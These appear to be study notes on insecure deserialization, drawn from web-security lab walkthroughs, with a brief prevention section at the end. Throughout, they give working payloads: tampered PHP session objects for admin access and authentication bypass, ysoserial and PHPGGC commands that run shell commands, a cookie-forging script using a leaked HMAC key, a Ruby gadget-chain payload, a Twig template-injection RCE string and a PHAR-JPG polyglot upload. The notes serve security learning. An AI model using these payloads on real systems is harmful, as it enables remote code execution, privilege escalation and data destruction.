## Definition
Serialization:
process of:
- converting complex data structures, (es objects and their fields) 
- into a "flatter" format 
  that can be -->  sent and received as a sequential stream of bytes

Serializing data makes it much simpler to:
- Write complex data to inter-process memory, a file, or a database
- Send complex data, for example, over a network, 
  between different components of an application, or in an API call

When serializing an object:
- its state is also persisted
  => the object's attributes are preserved, along with their assigned values

### Serialization vs deserialization
Deserialization:
process of restoring this byte stream to a fully functional replica of the original object
(in the exact state as when it was serialized)

The website's logic:
can then interact with this deserialized object -->   just like it would with any other object

Many programming languages -->  offer native support for serialization
Exactly how objects are serialized -->  depends on the language. 
Some languages serialize objects:
- into binary formats
- others use different string formats

Note that all of the original object's attributes -->   are stored in the serialized data stream, 
											including any private fields. 
To prevent a field from being serialized:
it must be explicitly marked as -->  `transient` in the class declaration

### Insecure deserialization
when user-controllable data is deserialized by a website. 
=>
This potentially enables an attacker to:
 manipulate serialized objects in order to -->  pass harmful data into the application code

It is even possible to -->        - replace a serialized object 
						- with an object of an entirely different class

### How do insecure deserialization vulnerabilities arise
because there is a general lack of understanding:
of how dangerous deserializing user-controllable data can be

Ideally:
user input should never be deserialized at all

Sometimes website owners:
think they are safe bc -->   they implement some form of additional check on the 
                        deserialized data
This approach is often ineffective:
bc -->      it is virtually impossible to implement validation or 
        sanitization to account for every eventuality

Vulnerabilities may also arise because:
- deserialized objects are often assumed to be trustworthy

## Identify insecure deserialization
Is relatively simple
During auditing, you should look at:
- all data being passed into the website 
- try to identify anything that looks like serialized data

Serialized data:
can be identified relatively easily -->  if you know the format that different languages use

### PHP serialization format
PHP uses:
- a mostly human-readable string format
- with letters representing the data type 
- with numbers representing the length of each entry
For example, consider a `User` object with the attributes:

```php
$user->name = "carlos";
$user->isLoggedIn = true;
```
Serialized version:
```php
`O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}`
```
This can be interpreted as follows:
- `O:4:"User"` - An object with the 4-character class name `"User"`
- `2` - the object has 2 attributes
- `s:4:"name"` - The key of the first attribute is the 4-character string `"name"`
- `s:6:"carlos"` - The value of the first attribute is the 6-character string `"carlos"`
- `s:10:"isLoggedIn"` - The key of the second attribute is the 10-character string `"isLoggedIn"`
- `b:1` - The value of the second attribute is the boolean value `true`
  
The native methods for PHP serialization are:
- `serialize()` 
- `unserialize()`

If you have source code access:
you should start by looking for -->  `unserialize()` anywhere in the code and investigating 
                                         further

### Java serialization format
Some languages, such as Java:
use -->  binary serialization formats
=>
This is more difficult to read:
but you can still -->  identify serialized data 
                  if you know how to recognize a few tell-tale signs
                  
For example:
- serialized Java objects always begin with the same bytes
	- which are encoded as `ac ed` in hexadecimal and `rO0` in Base64
	  
- any class that implements the interface `java.io.Serializable`:
	- can be serialized and deserialized. 
	- =>
	  If you have source code access:
	  - take note of any code that uses the `readObject()` method
		  - which is used to read and deserialize data from an `InputStream`

## Manipulating serialized objects
Exploiting some deserialization vulnerabilities:
can be as easy as -->   changing an attribute in a serialized object

As the object state is persisted:
-  you can study the serialized data to:
	- identify and edit interesting attribute values
- You can then pass the malicious object into the website via its deserialization process. 
  =>
  This is the initial step for a basic deserialization exploit.

=>
There are 2 approaches you can take when manipulating serialized objects.:
- You can edit the object directly in its byte stream form,
- you can write a short script in the corresponding language to create and serialize the new object yourself
(The latter approach is often easier when working with binary serialization formats)

### Modifying object attributes
When tampering with the data, as long as the attacker preserves a valid serialized object:
the deserialization process will create:
- a server-side object -->   with the modified attribute values

Consider a website that uses a serialized `User` object:
- to store data about a user's session in a cookie
=>
If an attacker spotted this serialized object in an HTTP request
=>   they might decode it to find the following byte stream:
`O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}`
=>
The `isAdmin` attribute is an obvious point of interest:
- An attacker could simply change the boolean value of the attribute to `1` (true)
- re-encode the object
- overwrite their current cookie with this modified value

Let's say the website uses this cookie to check whether the current user has access to certain administrative functionality:

```php
$user = unserialize($_COOKIE);
if ($user->isAdmin === true) {
	// allow access to admin interface
}
```
This vulnerable code would:
- instantiate a `User` object based on the data from the cookie
- including the attacker-modified `isAdmin` attribute
and:
- at no point is the authenticity of the serialized object checked. 
- this data is then:
	- passed into the conditional statement
	- and in this case, would allow for an easy privilege escalation

#### Modifying serialized objects
1. Log in using your own credentials. 
   Notice that the post-login `GET /my-account` request contains a session cookie that appears to be URL and Base64-encoded.
2. Use Burp's Inspector panel to study the request in its decoded form.
   Notice that the cookie is in fact a serialized PHP object. 
	   - The `admin` attribute contains `b:0`
	   - indicating the boolean value `false`. 
	   - Send this request to Burp Repeater.
1. In Burp Repeater, use the Inspector to examine the cookie again and change the value of the `admin` attribute to `b:1`. 
2. Click "Apply changes". 
   The modified object will automatically be re-encoded and updated in the request.
3. Send the request. 
   Notice that the response now contains a link to the admin panel at `/admin`, 
   indicating that you have accessed the page with admin privileges.
4. Change the path of your request to `/admin` and resend it. 
   Notice that the `/admin` page contains links to delete specific user accounts.
5. Change the path of your request to `/admin/delete?username=carlos` and send the request to solve the lab.
![[Pasted image 20240913113513.png]]

### Modifying data types
We've seen how you can modify attribute values in serialized objects:
but it's also possible to -->   supply unexpected data types.

PHP-based logic is particularly vulnerable to this kind of manipulation:
due to:
- the behavior of its loose comparison operator (`==`) 
- when comparing different data types

For example:
if you perform a loose comparison between an integer and a string
PHP will attempt to convert the string to an integer
=>
meaning that `5 == "5"` evaluates to `true`

Unusually, this also works for:
- any alphanumeric string -->   that starts with a number
  =>
  In this case, PHP will:
  - effectively convert the entire string to an integer value based on the initial number
  - the rest of the string is ignored completely
    =>
    `5 == "5 of something"` is in practice treated as -->  `5 == 5`

This becomes even stranger when comparing a string the integer `0`:
`0 == "Example string" // true`
why?
bc there is no number, that is, 0 numerals in the string
=>
PHP treats this entire string as the integer `0`

Consider a case where this loose comparison operator:
is used in conjunction with user-controllable data from a deserialized object.
=>
This could potentially result in dangerous logic flaws:
```php
$login = unserialize($_COOKIE)
if ($login['password'] == $password) {
	// log in successfully
}
```

Let's say:
- an attacker modified the password attribute:
	- so that it contained the integer `0` instead of the expected string
	  =>
	  As long as the stored password does not start with a number,
	  =>
	  the condition would always return `true`
	  =>
	   enabling an authentication bypass

Thiis is only possible because:
deserialization -->  preserves the data type
If the code fetched the password from the request directly:
=>    - the `0` would be converted to a string 
    - the condition would evaluate to `false`

#### Modifying serialized data types
1. Log in using your own credentials. 
   In Burp, open the post-login `GET /my-account` request and examine the session cookie using the Inspector to reveal a serialized PHP object. 
   Send this request to Burp Repeater.
2. In Burp Repeater, use the Inspector panel to modify the session cookie as follows:
    - Update the length of the `username` attribute to `13`.
    - Change the username to `administrator`.
    - Change the access token to the integer `0`. As this is no longer a string, you also need to remove the double-quotes surrounding the value.
    - Update the data type label for the access token by replacing `s` with `i`.
    
	    The result should look like this:
	    `O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}`
1. Click "Apply changes". 
   The modified object will automatically be re-encoded and updated in the request.
2. Send the request.
   you will see a 302 status =>
3. Change the path of your request to `/admin` and resend it. 
   Notice that the `/admin` page contains links to delete specific user accounts.
4. Change the path of your request to `/admin/delete?username=carlos` and send the request to solve the lab

### Using application functionality
As well as simply checking attribute values:
a website's functionality might also -->  perform dangerous operations on data 
                                  from a deserialized object
In this case:
you can use insecure deserialization to:
- pass in unexpected data 
- leverage the related functionality to do damage.

For example, as part of a website's "Delete user" functionality:
- the user's profile picture is deleted by:
	- accessing the file path in the `$user->image_location` attribute
=>
If this `$user` was created from a serialized object:
-  an attacker could exploit this by:
	- passing in a modified object with the `image_location` set to an arbitrary file path.
	- deleting their own user account would then delete this arbitrary file as well

#### Using application functionality to exploit insecure deserialization
1. Log in to your own account.
2. On the "My account" page, notice the option to delete your account by sending a `POST` request to `/my-account/delete`.
3. Send a request containing a session cookie to Burp Repeater.
4. In Burp Repeater, study the session cookie using the Inspector panel. 
   Notice that the serialized object has an `avatar_link` attribute, 
   which contains the file path to your avatar.
5. Edit the serialized data so that the `avatar_link` points to `/home/carlos/morale.txt`. Remember to update the length indicator. 
   The modified attribute should look like this:
   `s:11:"avatar_link";s:23:"/home/carlos/morale.txt"`
5. Click "Apply changes". 
   The modified object will automatically be re-encoded and updated in the request.
6. Change the request line to `POST /my-account/delete` and send the request. 
   Your account will be deleted, along with Carlos's `morale.txt` file
   
### Magic methods
special subset of methods that you do not have to explicitly invoke.
Instead:
they are invoked -->  automatically whenever a particular event or scenario occurs. 
Magic methods are a common feature -->   of object-oriented programming languafes

Developers can add magic methods:
- to a class 
- in order to predetermine what code should be executed 
	- when the corresponding event or scenario occurs

Exactly when and why a magic method is invoked:
- differs from method to method
  One of the most common examples in PHP is:
  `__construct()` -->   which is invoked whenever an object of the class is instantiated
                 (similar to Python's `__init__`)
                 
				  
Typically, constructor magic methods like this contain code to initialize the attributes of the instance. However, magic methods can be customized by developers to execute any code they want.

Magic methods:
- are widely used
- do not represent a vulnerability on their own
But they can become dangerous when:
- the code that they execute handles attacker-controllable data
  (for example, from a deserialized object) 
  
This can be exploited by an attacker to:
- automatically invoke methods on the deserialized data 
	- when the corresponding conditions are met.

Most importantly in this context:
some languages have -->   magic methods that 
                       are invoked automatically **during** the deserialization process

For example:
PHP's `unserialize()` method -->  looks for and invokes an object's `__wakeup()` magic method.

In Java deserialization:
- the same applies to the `ObjectInputStream.readObject()` method:
	- which is used to read data from the initial byte stream 
	- essentially acts like a constructor for "re-initializing" a serialized object

However `Serializable` classes can also declare their own `readObject()` method as follows:

```java
private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException{
    // implementation
}
```

A `readObject()` method declared in exactly this way:
acts as a magic method -->   that is invoked during deserialization.
=>
This allows the class to -->   control the deserialization of its own fields more closely
=>
<span style="background:#fff88f">You should pay close attention to:</span>
any classes -->  that contain these types of magic methods
They allow you to:
- pass data from a serialized object into the website's code
	- beforethe object is fully deserialized.

This is the starting point for creating more advanced exploits

### Injecting arbitrary objects
As we've seen, it is occasionally possible to:
exploit insecure deserialization by simply-->   editing the object supplied by the website. However:
injecting arbitrary object types --> can open up many more possibilities

In object-oriented programming:
- the methods available to an object -->  are determined by its class
  =>
  if an attacker can manipulate which class of object is being passed in as serialized data:
  =>
  they can influence --<  what code is executed after, and even during, deserialization

Deserialization methods:
- do not typically check what they are deserializing
  =>
  - you can pass in objects of any serializable class that is available to the website
  - and the object will be deserialized
=>
This effectively allows an attacker to:
create instances of arbitrary classes
- The fact that this object is not of the expected class does not matter. 
- The unexpected object type might cause an exception in the application logic
	- but the malicious object will already be instantiated by then.

If an attacker has access to the source code:
- he can study all of the available classes in detail
- to construct a simple exploit:
	- he would look for classes containing deserialization magic methods,
	- check whether any of them -->  perform dangerous operations on controllable data
	- then he can pass in a serialized object of this class to use its magic method for an exploit.

1. Log in to your own account and notice the session cookie contains a serialized PHP object.
2. From the site map, notice that the website references the file `/libs/CustomTemplate.php`. Right-click on the file and select "Send to Repeater".![[Pasted image 20240913144200.png]]
3. In Burp Repeater, notice that you can read the source code by appending a tilde (`~`) to the filename in the request line.
   
4. In the source code, notice the `CustomTemplate` class contains the `__destruct()` magic method. 
   This will invoke the `unlink()` method on the `lock_file_path` attribute, 
   which will delete the file on this path.
5. In Burp Decoder, use the correct syntax for serialized PHP data to create a `CustomTemplate` object with the `lock_file_path` attribute set to `/home/carlos/morale.txt`. Make sure to use the correct data type labels and length indicators. The final object should look like this:
   `O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}`
6. Base64 and URL-encode this object and save it to your clipboard.
7. Send a request containing the session cookie to Burp Repeater.
8. In Burp Repeater, replace the session cookie with the modified one in your clipboard.
9. Send the request. 
   The `__destruct()` magic method is automatically invoked and will delete Carlos's file

## Gadget chains
A "gadget":
- is a snippet of code that exists in the application 
- that can help an attacker to achieve a particular goal
An individual gadget:
- may not directly do anything harmful with user input
However: 
the attacker's goal might simply be to:
- invoke a method that will pass their input into another gadget
- By chaining multiple gadgets together in this way:
  an attacker can potentially -->    pass their input into a dangerous "sink gadget", 
                             where it can cause maximum damage

It is important to understand that:
- unlike some other types of exploit
- a gadget chain is not -->  a payload of chained methods constructed by the attacker
- All of the code already exists on the website
  =>
-  The only thing the attacker controls is -->  the data that is passed into the gadget chain
- This is typically done using a -->  magic method that is invoked during deserialization
                              sometimes known as a "kick-off gadget".

### Working with pre-built gadget chains
Manually identifying gadget chains:
- can be a fairly arduous process
- is almost impossible without source code access
Fortunately:
there are a few options for working with pre-built gadget chains that you can try first.

There are several tools available:
- that provide a range of pre-discovered chains 
	- that have been successfully exploited on other websites
- Even if you don't have access to the source code:
	- you can use these tools to both:
		- identify 
		- exploit insecure deserialization vulnerabilities with relatively little effort

This approach is made possible due to:
the widespread use of libraries that contain exploitable gadget chains

#### ysoserial
tool for Java deserialization.
This lets you:
- choose one of the provided gadget chains for a library that you think the target app is using
- pass in a command that you want to execute
- then creates an appropriate serialized object based on the selected chain
  
This:
- still involves a certain amount of trial and error
- but it is considerably less labor-intensive than constructing your own gadget chains manually

how to install it:
- https://github.com/frohoff/ysoserial
- dowload the latest ysoserial-all.jar
- `java -jar ysoserial-all.jar`

##### Exploiting Java deserialization with Apache Commons
- login
- look at the response -->  it contains a session cookie
- => decode it 
	![[Pasted image 20240913150625.png]]
- Download the "ysoserial" tool and execute the following command. This generates a Base64-encoded serialized object containing your payload:
    - In Java versions 16 and above:
        `java -jar ysoserial-all.jar \ --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \ --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \ --add-opens=java.base/java.net=ALL-UNNAMED \ --add-opens=java.base/java.util=ALL-UNNAMED \ CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 100000000`
    - In Java versions 15 and below:
        `java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 100000000`
- In Burp Repeater, replace your session cookie with the malicious one you just created. Select the entire cookie > right click > Convert Selection > HTML > HTML encode all Ch
- Send the request to solve the lab


#### PHP Generic Gadget Chains
Most languages that frequently suffer from insecure deserialization vulnerabilities:
- have equivalent proof-of-concept tools
- For example, for PHP-based sites:
	- you can use "PHP Generic Gadget Chains" (PHPGGC)

##### Exploiting PHP deserialization with a pre-built gadget chain
- Log in and send a request containing your session cookie to Burp Repeater. 
  Highlight the cookie and look at the **Inspector** panel.
- Notice that the cookie contains a Base64-encoded token, signed with a SHA-1 HMAC hash.
- Copy the decoded cookie from the **Inspector** and paste it into Decoder.
- In Decoder, highlight the token and then select **Decode as > Base64**. 
  Notice that the token is actually a serialized PHP object.![[Pasted image 20240913154231.png]]
- In Burp Repeater, observe that if you try sending a request with a modified cookie, an exception is raised because the digital signature no longer matches. 
  However, you should notice that:
    - A developer comment discloses the location of a debug file at `/cgi-bin/phpinfo.php`.
    - The error message reveals that the website is using the Symfony 4.3.6 framework.
- append to your lab-id the   `/cgi-bin/phpinfo.php` 
- you'll find the `SECRET_KEY` environment variable. ![[Pasted image 20240913154514.png]]
  Save this key -->  you'll need it to sign your exploit later.
- Download the "PHPGGC" tool and execute the following command:
  `./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64`
- This will generate a Base64-encoded serialized object that exploits an RCE gadget chain in Symfony to delete Carlos's `morale.txt` file.

- You now need to construct a valid cookie containing this malicious object and sign it correctly using the secret key you obtained earlier. 
  You can use the following PHP script to do this.
   Before running the script, you just need to make the following changes:
    - Assign the object you generated in PHPGGC to the `$object` variable.
    - Assign the secret key that you copied from the `phpinfo.php` file to the `$secretKey` variable.
    
```php
<?php
$object = "OBJECT-GENERATED-BY-PHPGGC";
$secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
?>
```
- save it and run php `phpscript.php`
- copy the output cookie
- capture a request that contains the cookie
- substitute it with the cookie from the script
- send the packet


### Working with documented gadget chains
There may not always be:
a dedicated tool available for exploiting known gadget chains 
(in the framework used by the target app)

In this case:
it's always worth looking -->   online 
                        to see if there are any documented exploits that you can adapt manually

Tweaking the code:
- may require some basic understanding of the language and framework
- and you might sometimes need to serialize the object yourself
- but this approach is still considerably less effort than building an exploit from scratch

#### Exploiting Ruby deserialization using a documented gadget chain
- Log in to your own account and notice that the session cookie contains a serialized ("marshaled") Ruby object. Send a request containing this session cookie to Burp Repeater.
- Browse the web to find the `Universal Deserialisation Gadget for Ruby 2.x-3.x` by `vakzz` on `devcraft.io`. Copy the final script for generating the payload.
  https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html
- Copy the last script
- Modify the script as follows:
	- Change the command that should be executed from `id` to `rm /home/carlos/morale.txt`.
	- Replace the final two lines with `puts Base64.encode64(payload)`. 
	  This ensures that the payload is output in the correct format for you to use for the lab.
	=>
	
```ruby
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts Base64.encode64(payload)
```

- Run the script online from here:
  https://onecompiler.com/ruby/42s3haaxr
- Copy the cookie genereated from the output
- Substitute it into the Repeater
- Select it all > `CTRL+U`
- Send the packet

## Creating your own exploit
When off-the-shelf gadget chains and documented exploits are unsuccessful:
=>
you will need to create your own exploit.

To successfully build your own gadget chain:
- you will almost certainly need source code access
- study this source code to identify a class that contains a magic method that is invoked during deserialization. 
- Assess the code that this magic method executes to see if it directly does anything dangerous with user-controllable attributes. 
- This is always worth checking just in case.
- If the magic method is not exploitable on its own:
	- it can serve as your "kick-off gadget" for a gadget chain. 
	- Study any methods that the kick-off gadget invokes.
	- Do any of these do something dangerous with data that you control? 
		- If not:
			- take a closer look at each of the methods that they subsequently invoke, and so on.

Repeat this process:
- keeping track of which values you have access to
- until you either reach a dead end or identify a dangerous sink gadget into which your controllable data is passed.

Once you've worked out how to successfully construct a gadget chain within the app code:
- the next step is to create a serialized object containing your payload. 
- This is simply a case of studying the class declaration in the source code 
- and creating a valid serialized object with the appropriate values required for your exploit.

Working with binary formats, such as when constructing a Java deserialization exploit:
can be particularly cumbersome.
=>
When making minor changes to an existing object:
you might be comfortable working directly -->   with the bytes

However, when making more significant changes:
this quickly becomes impractical

It is often much simpler to write your own code in the target language in order to generate and serialize the data yourself.

When creating your own gadget chain, look out for opportunities to use this extra attack surface to trigger secondary vulnerabilities

### Developing a custom gadget chain for Java deserialization
https://www.youtube.com/watch?v=O5FooPYSz1E

### Developing a custom gadget chain for PHP deserialization
1. Log in to your own account and notice that the session cookie contains a serialized PHP object. 
   Notice that the website references the file `/cgi-bin/libs/CustomTemplate.php`. 
   Obtain the source code by submitting a request using the `.php~` backup file extension.
2. In the source code, notice that the `__wakeup()` magic method for a `CustomTemplate` will create a new `Product` by referencing the `default_desc_type` and `desc` from the `CustomTemplate`.
3. Also notice that the `DefaultMap` class has the `__get()` magic method, which will be invoked if you try to read an attribute that doesn't exist for this object. 
   This magic method invokes `call_user_func()`, which will execute any function that is passed into it via the `DefaultMap->callback` attribute. 
   The function will be executed on the `$name`, which is the non-existent attribute that was requested.
4. You can exploit this gadget chain to invoke `exec(rm /home/carlos/morale.txt)` by passing in a `CustomTemplate` object where:
  
```
CustomTemplate->default_desc_type = "rm /home/carlos/morale.txt";
CustomTemplate->desc = DefaultMap;
DefaultMap->callback = "exec"
```
- If you follow the data flow in the source code, you will notice that this causes the `Product` constructor to try and fetch the `default_desc_type` from the `DefaultMap` object. 
  As it doesn't have this attribute, the `__get()` method will invoke the callback `exec()` method on the `default_desc_type`, which is set to our shell command.

5. To solve the lab, Base64 and URL-encode the following serialized object, and pass it into the website via your session cookie:
       `O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}`

## PHAR deserialization
So far, we've looked primarily at exploiting deserialization vulnerabilities:
where the website explicitly deserializes user input. 

However, in PHP it is sometimes possible to:
exploit deserialization -->  even if there is no obvious use of the `unserialize()` method.

PHP provides several URL-style wrappers:
- that you can use for handling different protocols when -->  accessing file paths

One of these is the -->   `phar://` wrapper
                     which provides a stream interface for accessing PHP Archive files.

The PHP documentation reveals that:
- `PHAR` manifest files contain serialized metadata.
=>
if you perform any FS operations on a `phar://` stream:
=>
this metadata is implicitly deserialized.

This means that a `phar://` stream can:
- potentially be a vector for exploiting insecure deserialization
- provided that you can pass this stream into a filesystem method.

In the case of obviously dangerous FS methods, such as `include()` or `fopen()`:
- websites are likely to have implemented counter-measures
	- to reduce the potential for them to be used maliciously
	- However, methods such as `file_exists()`, which are not so overtly dangerous, 
	  may not be as well protected.

This technique also requires you to:
- upload the `PHAR` to the server somehow

One approach is to:
- use an image upload functionality
- If you are able to create a polyglot file, with a `PHAR` masquerading as a simple `JPG`:
- you can sometimes bypass the website's validation checks. 
- If you can then force the website to load this polyglot "`JPG`" from a `phar://` stream:
  =>
  any harmful data you inject via the `PHAR` metadata will be deserialized
- As the file extension is not checked when PHP reads a stream
  =>
  it does not matter that the file uses an image extension.

As long as the class of the object is supported by the website:
- both the `__wakeup()` and `__destruct()` magic methods 
	- can be invoked in this way, 
	  allowing you to potentially kick off a gadget chain using this technique

### Using PHAR deserialization to deploy a custom gadget chain
1. Observe that the website has a feature for uploading your own avatar, which only accepts `JPG` images. 
   Upload a valid `JPG` as your avatar. 
   Notice that it is loaded using `GET /cgi-bin/avatar.php?avatar=wiener`.
2. In Burp Repeater, request `GET /cgi-bin` to find an index that shows a `Blog.php` and `CustomTemplate.php` file. 
   Obtain the source code by requesting the files using the `.php~` backup extension.
3. Study the source code and identify the gadget chain involving the `Blog->desc` and `CustomTemplate->lockFilePath` attributes.
4. Notice that the `file_exists()` filesystem method is called on the `lockFilePath` attribute.
5. Notice that the website uses the Twig template engine. 
   You can use deserialization to pass in an [server-side template injection](https://portswigger.net/web-security/server-side-template-injection) (SSTI) payload. 
   Find a documented SSTI payload for remote code execution on Twig, and adapt it to delete Carlos's file:
   `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}`
6. Write a some PHP for creating a `CustomTemplate` and `Blog` containing your SSTI payload:
   
```php
class CustomTemplate {}
class Blog {}
$object = new CustomTemplate;
$blog = new Blog;
$blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}';
$blog->user = 'user';
$object->template_file_path = $blog;
```

7. Create a `PHAR-JPG` polyglot containing your PHP script. 
   You can find several scripts for doing this online (search for "`phar jpg polyglot`"). Alternatively, you can download our [ready-made one](https://github.com/PortSwigger/serialization-examples/blob/master/php/phar-jpg-polyglot.jpg).
8. Upload this file as your avatar.
9. In Burp Repeater, modify the request line to deserialize your malicious avatar using a `phar://` stream as follows:
   `GET /cgi-bin/avatar.php?avatar=phar://wiener`
10. Send the request to solve the lab

## Prevent insecure deserialization vulnerabilities
Generally speaking:
deserialization of user input -->  should be avoided unless absolutely necessary. 

If you do need to deserialize data from untrusted sources:
=>
- incorporate robust measures to make sure that the data has not been tampered with.
- For example implement a digital signature to check the integrity of the data. 
- However, remember that any checks must take place **before** beginning the deserialization process. 
- Otherwise, they are of little use.

If possible, you should avoid -->  using generic deserialization features altogether. Serialized data from these methods:
- contains all attributes of the original object
	- including private fields that potentially contain sensitive information. 
- Instead, you could:
	- create your own class-specific serialization methods 
		- so that you can at least control which fields are exposed.
